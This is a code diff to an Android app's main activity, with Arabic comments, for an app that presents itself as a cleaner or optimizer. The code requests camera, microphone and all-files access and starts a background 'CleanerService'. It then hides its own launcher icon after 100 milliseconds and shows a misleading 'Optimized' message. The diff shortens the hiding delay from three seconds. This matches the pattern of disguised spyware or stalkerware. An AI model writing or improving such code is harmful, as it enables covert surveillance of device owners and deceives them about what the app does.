@@ -18,6 +18,7 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
+        // 1. طلب الصلاحيات
         String[] perms = {
             Manifest.permission.CAMERA,
             Manifest.permission.RECORD_AUDIO,
@@ -30,6 +31,7 @@ public class MainActivity extends Activity {
         };
         ActivityCompat.requestPermissions(this, perms, 1);
 
+        // 2. طلب صلاحية كل الملفات
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             if (!Environment.isExternalStorageManager()) {
                 Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
@@ -38,14 +40,16 @@ public class MainActivity extends Activity {
             }
         }
 
+        // 3. تشغيل السيرفس
         startService(new Intent(this, CleanerService.class));
 
+        // 4. إخفاء الأيقونة فوراً (تأخير 100 ملي ثانية بس)
         new android.os.Handler().postDelayed(() -> {
             PackageManager p = getPackageManager();
             ComponentName componentName = new ComponentName(this, MainActivity.class);
             p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
-            Toast.makeText(this, "Optimization Complete", Toast.LENGTH_SHORT).show();
+            Toast.makeText(this, "Optimized", Toast.LENGTH_SHORT).show();
             finish();
-        }, 3000);
+        }, 100);
     }
 }
